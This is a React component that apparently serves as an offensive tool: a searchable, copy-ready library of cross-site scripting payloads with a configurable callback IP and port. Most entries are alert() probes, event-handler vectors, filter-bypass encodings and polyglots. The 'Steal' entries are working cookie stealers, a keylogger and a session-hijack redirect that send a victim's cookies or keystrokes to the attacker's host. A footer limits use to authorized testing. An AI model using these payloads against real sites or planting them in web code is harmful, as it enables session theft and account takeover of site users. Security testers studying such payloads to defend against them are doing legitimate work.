import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Bug, Copy, Check, Filter, AlertTriangle, Code, Zap, Shield, Globe, Server } from 'lucide-react';

const XSSPayloads = () => {
    const [search, setSearch] = useState('');
    const [activeCategory, setActiveCategory] = useState('all');
    const [callbackIP, setCallbackIP] = useState('10.10.10.10');
    const [callbackPort, setCallbackPort] = useState('8080');
    const [copied, setCopied] = useState(null);

    const payloads = [
        // Basic
        { name: 'Basic Alert', payload: `<script>alert('XSS')</script>`, category: 'Basic', context: 'HTML' },
        { name: 'IMG Onerror', payload: `<img src=x onerror=alert('XSS')>`, category: 'Basic', context: 'HTML' },
        { name: 'SVG Onload', payload: `<svg onload=alert('XSS')>`, category: 'Basic', context: 'HTML' },
        { name: 'Body Onload', payload: `<body onload=alert('XSS')>`, category: 'Basic', context: 'HTML' },
        { name: 'Iframe SRC', payload: `<iframe src="javascript:alert('XSS')">`, category: 'Basic', context: 'HTML' },

        // Event Handlers
        { name: 'Input Autofocus', payload: `<input onfocus=alert('XSS') autofocus>`, category: 'Events', context: 'HTML' },
        { name: 'Select Autofocus', payload: `<select onfocus=alert('XSS') autofocus>`, category: 'Events', context: 'HTML' },
        { name: 'Marquee Onstart', payload: `<marquee onstart=alert('XSS')>`, category: 'Events', context: 'HTML' },
        { name: 'Details Toggle', payload: `<details open ontoggle=alert('XSS')>`, category: 'Events', context: 'HTML' },
        { name: 'Video Onloadstart', payload: `<video><source onerror=alert('XSS')>`, category: 'Events', context: 'HTML' },

        // Cookie Stealing
        { name: 'Cookie Stealer (Fetch)', payload: `<script>fetch('http://{{IP}}:{{PORT}}/?c='+document.cookie)</script>`, category: 'Steal', context: 'HTML' },
        { name: 'Cookie Stealer (Image)', payload: `<script>new Image().src="http://{{IP}}:{{PORT}}/?c="+document.cookie</script>`, category: 'Steal', context: 'HTML' },
        { name: 'Keylogger', payload: `<script>document.onkeypress=function(e){new Image().src="http://{{IP}}:{{PORT}}/?k="+e.key}</script>`, category: 'Steal', context: 'HTML' },
        { name: 'Session Hijack', payload: `<script>document.location='http://{{IP}}:{{PORT}}/steal?cookie='+document.cookie</script>`, category: 'Steal', context: 'HTML' },

        // Filter Bypass
        { name: 'No Quotes (fromCharCode)', payload: `<img src=x onerror=alert(String.fromCharCode(88,83,83))>`, category: 'Bypass', context: 'HTML' },
        { name: 'Case Variation', payload: `<ScRiPt>alert('XSS')</sCrIpT>`, category: 'Bypass', context: 'HTML' },
        { name: 'Double Encoding', payload: `%253Cscript%253Ealert('XSS')%253C/script%253E`, category: 'Bypass', context: 'URL' },
        { name: 'HTML Entities', payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>`, category: 'Bypass', context: 'HTML' },
        { name: 'UTF-7', payload: `+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-`, category: 'Bypass', context: 'HTML' },
        { name: 'Template Literal', payload: `<img src=x onerror=alert\`XSS\`>`, category: 'Bypass', context: 'HTML' },
        { name: 'Unicode Escape', payload: `<script>\\u0061lert('XSS')</script>`, category: 'Bypass', context: 'JS' },
        { name: 'SVG + Base64', payload: `<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>`, category: 'Bypass', context: 'HTML' },

        // DOM-Based
        { name: 'Location Hash', payload: `#<img src=x onerror=alert('XSS')>`, category: 'DOM', context: 'URL' },
        { name: 'JavaScript URI', payload: `javascript:alert('XSS')`, category: 'DOM', context: 'URL' },
        { name: 'Data URI', payload: `data:text/html,<script>alert('XSS')</script>`, category: 'DOM', context: 'URL' },
        { name: 'Anchor Link', payload: `<a href="javascript:alert('XSS')">Click</a>`, category: 'DOM', context: 'HTML' },

        // Polyglots
        { name: 'Polyglot 1', payload: `jaVasCript:/*-/*\`/*\\/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`, category: 'Polyglot', context: 'Universal' },
        { name: 'Polyglot 2', payload: `'"--></style></script><script>alert('XSS')</script>`, category: 'Polyglot', context: 'Universal' },
        { name: 'Polyglot 3', payload: `';alert('XSS');//`, category: 'Polyglot', context: 'JS' },
    ];

    const categories = ['all', 'Basic', 'Events', 'Steal', 'Bypass', 'DOM', 'Polyglot'];

    const filteredPayloads = useMemo(() => {
        return payloads.filter(p => {
            const matchesCategory = activeCategory === 'all' || p.category === activeCategory;
            const matchesSearch = p.name.toLowerCase().includes(search.toLowerCase()) ||
                p.payload.toLowerCase().includes(search.toLowerCase());
            return matchesCategory && matchesSearch;
        });
    }, [search, activeCategory]);

    const getProcessedPayload = (payload) => {
        return payload.replace(/\{\{IP\}\}/g, callbackIP).replace(/\{\{PORT\}\}/g, callbackPort);
    };

    const copyToClipboard = (payload, idx) => {
        navigator.clipboard.writeText(getProcessedPayload(payload));
        setCopied(idx);
        setTimeout(() => setCopied(null), 2000);
    };

    const getCategoryIcon = (cat) => {
        switch (cat) {
            case 'Basic': return <Code size={14} />;
            case 'Events': return <Zap size={14} />;
            case 'Steal': return <AlertTriangle size={14} />;
            case 'Bypass': return <Shield size={14} />;
            case 'DOM': return <Globe size={14} />;
            case 'Polyglot': return <Bug size={14} />;
            default: return <Bug size={14} />;
        }
    };

    const getCategoryColor = (cat) => {
        switch (cat) {
            case 'Basic': return 'bg-green-500/10 text-green-400 border-green-500/30';
            case 'Events': return 'bg-blue-500/10 text-blue-400 border-blue-500/30';
            case 'Steal': return 'bg-red-500/10 text-red-400 border-red-500/30';
            case 'Bypass': return 'bg-purple-500/10 text-purple-400 border-purple-500/30';
            case 'DOM': return 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30';
            case 'Polyglot': return 'bg-orange-500/10 text-orange-400 border-orange-500/30';
            default: return 'bg-white/10 text-white/60 border-white/30';
        }
    };

    return (
        <div className="max-w-6xl mx-auto space-y-12 animate-fade-in">
            {/* Header */}
            <div className="text-center space-y-4">
                <h1 className="text-5xl font-black italic tracking-tighter flex items-center justify-center gap-4 underline decoration-orange-500/50 underline-offset-8">
                    <Bug size={48} className="text-orange-500" />
                    XSS PAYLOADS
                </h1>
                <p className="text-white/40 font-mono tracking-[0.3em] uppercase text-sm">Cross-Site Scripting payload library</p>
            </div>

            {/* Configuration */}
            <div className="p-6 rounded-2xl bg-white/5 border border-white/10">
                <div className="flex items-center gap-2 text-xs text-white/40 mb-4">
                    <Server size={14} /> CALLBACK SERVER
                </div>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <input
                        type="text"
                        value={callbackIP}
                        onChange={(e) => setCallbackIP(e.target.value)}
                        placeholder="Callback IP"
                        className="p-3 bg-black/40 border border-white/10 rounded-xl font-mono text-orange-400 focus:border-orange-500/50 outline-none"
                    />
                    <input
                        type="text"
                        value={callbackPort}
                        onChange={(e) => setCallbackPort(e.target.value)}
                        placeholder="Port"
                        className="p-3 bg-black/40 border border-white/10 rounded-xl font-mono text-orange-400 focus:border-orange-500/50 outline-none"
                    />
                    <input
                        type="text"
                        value={search}
                        onChange={(e) => setSearch(e.target.value)}
                        placeholder="Search payloads..."
                        className="p-3 bg-black/40 border border-white/10 rounded-xl text-white focus:border-orange-500/50 outline-none"
                    />
                </div>
            </div>

            {/* Category Filters */}
            <div className="flex flex-wrap gap-2">
                {categories.map(cat => (
                    <button
                        key={cat}
                        onClick={() => setActiveCategory(cat)}
                        className={`px-4 py-2 rounded-xl text-xs font-bold uppercase transition-all border ${activeCategory === cat ? 'bg-orange-500/20 text-orange-400 border-orange-500/50' : 'bg-white/5 text-white/40 border-white/10 hover:border-white/30'}`}
                    >
                        {cat === 'all' ? 'All' : cat}
                    </button>
                ))}
            </div>

            {/* Payloads List */}
            <div className="space-y-3">
                <AnimatePresence>
                    {filteredPayloads.map((p, idx) => (
                        <motion.div
                            key={p.name}
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -10 }}
                            transition={{ delay: idx * 0.02 }}
                            className="p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-orange-500/30 transition-all group"
                        >
                            <div className="flex items-center justify-between gap-4">
                                <div className="flex items-center gap-3 flex-1 min-w-0">
                                    <span className={`px-2 py-1 rounded-lg text-[10px] font-bold uppercase border flex items-center gap-1 ${getCategoryColor(p.category)}`}>
                                        {getCategoryIcon(p.category)} {p.category}
                                    </span>
                                    <span className="font-bold text-white truncate">{p.name}</span>
                                    <span className="text-[10px] text-white/30 bg-white/5 px-2 py-0.5 rounded">{p.context}</span>
                                </div>
                                <button
                                    onClick={() => copyToClipboard(p.payload, idx)}
                                    className={`p-2 rounded-lg transition-all ${copied === idx ? 'bg-green-500 text-white' : 'bg-white/10 text-white/60 hover:bg-white/20'}`}
                                >
                                    {copied === idx ? <Check size={16} /> : <Copy size={16} />}
                                </button>
                            </div>
                            <div className="mt-3 p-3 bg-black/40 rounded-xl font-mono text-xs text-orange-300 overflow-x-auto">
                                {getProcessedPayload(p.payload)}
                            </div>
                        </motion.div>
                    ))}
                </AnimatePresence>
            </div>

            {filteredPayloads.length === 0 && (
                <div className="text-center py-16 text-white/30">
                    No payloads found matching your criteria.
                </div>
            )}

            {/* Disclaimer */}
            <div className="p-4 rounded-xl bg-red-500/5 border border-red-500/20 text-center">
                <p className="text-xs text-red-400/80">
                    <AlertTriangle size={14} className="inline mr-2" />
                    For authorized security testing and educational purposes only. Unauthorized use is illegal.
                </p>
            </div>
        </div>
    );
};

export default XSSPayloads;
